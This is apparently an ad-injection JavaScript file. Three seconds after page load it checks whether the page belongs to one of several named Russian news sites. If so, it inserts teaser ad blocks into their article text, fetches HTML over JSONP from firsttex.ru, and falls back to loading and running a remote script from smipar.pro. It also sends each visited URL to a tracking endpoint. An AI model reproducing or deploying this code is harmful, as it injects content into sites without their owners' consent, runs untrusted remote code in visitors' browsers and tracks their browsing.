// politexpert - right-col x3

var jolly_settings_1537 = {
    partner_id : '2f3a4fccca6406e35bcf33e92dd93135',
    count : 3,
    url: window.location.href.toString().substr(0, 512),
   // ,source: 'rp_cinema'
};

if (typeof jolly_callback_1537 === "undefined") {
    var jolly_callback_1537 = {};
}

function jolly_request_1537(url, params, onSuccess, onError) {
    var scriptOk = false;
    var callbackName = 'cb' + String(Math.random()).slice(-6);
    url += ~url.indexOf('?') ? '&' : '?';
    url += 'callback=jolly_callback_1537.' + callbackName;
    jolly_callback_1537[callbackName] = function(data) {
        scriptOk = true;
        delete jolly_callback_1537[callbackName];
        onSuccess(data);
    };
    function checkCallback() {
        if (scriptOk) return;
        delete jolly_callback_1537[callbackName];
        onError(url);
    }
    var script = document.createElement('script');

    script.onreadystatechange = function() {
        if (this.readyState == 'complete' || this.readyState == 'loaded') {
            this.onreadystatechange = null;
            setTimeout(checkCallback, 0);
        }
    }
    script.onload = script.onerror = checkCallback;

    var str = "";
    for (var key in params) {
        // if (str != "") {
        str += "&";
        // }
        str += key + "=" + encodeURIComponent(params[key]);
    }

    script.src = url+str;
    document.body.appendChild(script);
}


function jolly_insert_1537 (styles_block = 'default') {
    var source_url = "https://firsttex.ru";
    var url = new URL(window.location.href);

    let style = {
        'default' : '#container_1537 {position: relative;display: table;-webkit-box-sizing: content-box;-moz-box-sizing: content-box;box-sizing: content-box;margin-left: auto;margin-right: auto;margin-bottom: 0;width: auto;max-width: none;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-width: 0px;border-style: solid;border-color: #000000;background-image: none;background-repeat: repeat;background-position: 0 0;}#container_1537 .list-container {display: table-row;}#container_1537 .list-container-item {text-decoration: none;display: table-cell;position: relative;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;width: 33%;padding-top: 13px;padding-bottom: 13px;padding-left: 13px;padding-right: 13px;border-width: 0px;border-style: solid;border-color: #000000;background-image: none;background-repeat: repeat;background-position: 0 0;font-size: 0;vertical-align: top;transition-duration: 100ms;}#container_1537 .list-container-item .innerWrap{position: static;display: block;vertical-align: top;text-align: center;}#container_1537 .list-container-item .imgFrame {box-sizing: border-box;max-width: 550px !important;width: 100%;display: inline-block;vertical-align: inherit;}#container_1537 .list-container-item .imgFrame > div {background-position: center center;background-size: cover;background-repeat: no-repeat;display: block;height: 200px !important;}#container_1537 .list-container-item .title {width: 100%;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;padding-top: 3px;padding-right: 3px;padding-bottom: 3px;padding-left: 3px;color: #000000;font-family: \'Fira Sans\',sans-serif !important;font-size: 16px !important;line-height: 1.2;word-wrap: break-word;overflow: hidden;text-align: left;border: 0px !important;}#container_1537 .list-container-item .title:hover {}#container_1537 .list-container-item .clear {clear: left;}'
    };

    if (url.searchParams.get("ft_local_test")) {
        source_url = "";
        document.getElementById("kad_tgb_1537").innerHTML = "<div id=\"container_1537\"></div><link  rel=\"stylesheet\" type=\"text/css\" href=\"/css/b_src/1537_"+styles_block+".css\">";
    } else {
        document.getElementById("kad_tgb_1537").innerHTML = "<div id=\"container_1537\"></div><style>"+style[styles_block]+"</style>";;
    }

    jolly_request_1537(source_url + "/tgb/get/"
        , jolly_settings_1537
        , function (response) {
            if (response.response == 'ok') {
                //console.log(response);
                if (response.count && response.count == jolly_settings_1537.count
                ) {
                    if (response.html) {
                        document.getElementById("container_1537").innerHTML = response.html;
                    }
                } else {
                    //document.getElementById("container_1537").style.cssText = "display:none;";

                    document.getElementById("kad_tgb_1537").innerHTML = "<div id=\"MOIPqqs88Lr7JBpbawiP\"></div>";

                    (function(d,s,b,id){var js=d.createElement(s);
                        window.AD_DOMAIN_URL_SYS_8349582369 = '//smipar.pro/';
                        js.src='//smipar.pro/js/v1.2/script.min.js';
                        d.getElementsByTagName('head')[0].appendChild(js);
                        if(typeof d[b]=='undefined') d[b]=[];
                        d[b].push(id);})(document,'script','obTBlocks','MOIPqqs88Lr7JBpbawiP')

                }

            }
        }
        , function (response) {
            console.log('Good buy Error');
            console.log(response);
        }
    );
}

function fn_parseUrl(value) {
    if (typeof value !== 'string') {
        return undefined;
    }

    let protocol= null,
        user    = null,
        pass    = null,
        host    = null,
        port    = null,
        uri     = null,
        query   = null,
        hash    = null;

    let protocolAll = value.match(/^([^:]+):\/\/(.*)$/);
    if (!protocolAll || !protocolAll[1] || !protocolAll[2]) {
        return undefined;
    }

    if (protocolAll[1]) {
        protocol = protocolAll[1].toLowerCase();
    }

    let allHash = protocolAll[2].split('#', 2);
    hash = allHash[1] ? allHash[1] : null;

    let allQuery =  allHash[0].split('?', 2);
    query = allQuery[1] ? allQuery[1] : null;

    let allUri = allQuery[0].match(/^([^\/]+)(\/(.*))?$/);
    uri = allUri && allUri[2] ? allUri[2] : '/';

    let userpassUriport = allUri[1].split('@', 2);

    let userPass = userpassUriport[1] ? userpassUriport[0].split(':', 2) : null;
    let hostPost = (userPass ? userpassUriport[1] : userpassUriport[0]).split(':', 2);

    if (userPass) {
        if (userPass[0]) {
            user = userPass[0];

            if (userPass[1]) {
                pass = userPass[1];
            }
        }
    }

    host = hostPost[0].toLocaleLowerCase();
    if (hostPost[1]) {
        port = parseInt(hostPost[1])
    }

    if (!protocol || !host) {
        return undefined;
    }

    return {
        url:        value,
        protocol:   protocol,
        user:       user,
        pass:       pass,
        host:       host,
        port:       port,
        uri:        uri,
        query:      query,
        hash:       hash
    }
}

function jolly_init_1537() {

    console.log("Jolly, Insert please");

    let parts = fn_parseUrl(jolly_settings_1537.url);
    console.log(parts);
    if (typeof parts === 'undefined') {
        return;
    }
    (parts.host).replace(/^www\./, '');

    var img = document.createElement("img");
    img.src = 'https://firsttex.ru/tgb/track?partner_id='+jolly_settings_1537.partner_id+'&action=track&host='+parts.host+'&id='+Math.random()+'&session=test&client=test&url='+jolly_settings_1537.url;

    console.log("Try Jquery");
    try {
        if ((typeof jQuery === 'undefined') || (!jQuery.fn.jquery)) {
            //подгрузка jquery если на домене его вообще нет

            var img = document.createElement("img");
                img.src = 'https://firsttex.ru/tgb/track?partner_id='+jolly_settings_1537.partner_id+'&action=nojquery&host='+parts.host+'&id='+Math.random()+'&session=test&client=test';
            return;
        }
    } catch (e) {
        return;
    }

    console.log("Jquery OK. Host: " + parts.host);
    switch (parts.host) {
        case 'tizer.local':
            var content_block = '.article-text-body';
            if ($(content_block+' p').length > 3) {
                $(content_block+' p:eq(0)').append('<div id="kad_tgb_1537" style="width: 100%;"></div><style></style>');
                jolly_settings_1537.count = 2;
                jolly_insert_1537('default');
            }

            break;
        case 'gazeta.ru':
            var content_block = '.article-text-body';
            if ($(content_block+' p').length > 3) {
                $(content_block+' p:eq(0)').append('<div id="kad_tgb_1537" style="width: 100%;"></div><style></style>');
                jolly_settings_1537.count = 2;
                jolly_insert_1537('default');
            }

            break;
        case 'mk.ru':
            var content_block = '.content';
            if ($(content_block+' p').length > 3) {
                $(content_block+' p:eq(2)').append('<div id="kad_tgb_1537" style="width: 100%;"></div><style>#container_1537 .list-container-item .title img { width: 1px !important; height: 1px !important;}</style>');
                jolly_settings_1537.count = 2;
                jolly_insert_1537('default');
            }

            break;
        case 'news.ru':
            var content_block = '.article-text';
            if ($(content_block+' p').length > 3) {
                $(content_block+' p:first').append('<div id="kad_tgb_1537" style="width: 100%;"></div>');
                jolly_settings_1537.count = 2;
                jolly_insert_1537('default');
            }

            break;
        case 'rbc.ru':
            var content_block = '.article__text';
            if ($(content_block+' p').length > 3) {
                $(content_block+' p:first').append('<div id="kad_tgb_1537" style="width: 100%;"></div>');
                jolly_insert_1537('default');
            }
            break;
        case 'vesti.ru':
            var content_block = '.js-mediator-article';

            if ($('.js-mediator-article p').length > 3) {
                $('.js-mediator-article p:first').append('<div id="kad_tgb_1537" style="width: 100%;"></div>');
                jolly_insert_1537('default');
            }
            break;
        default:
            return;
            break;
    }



    return false;
};

(function() {
    console.log('MAGIC HERE AT ');
    setTimeout(jolly_init_1537,3000);
})();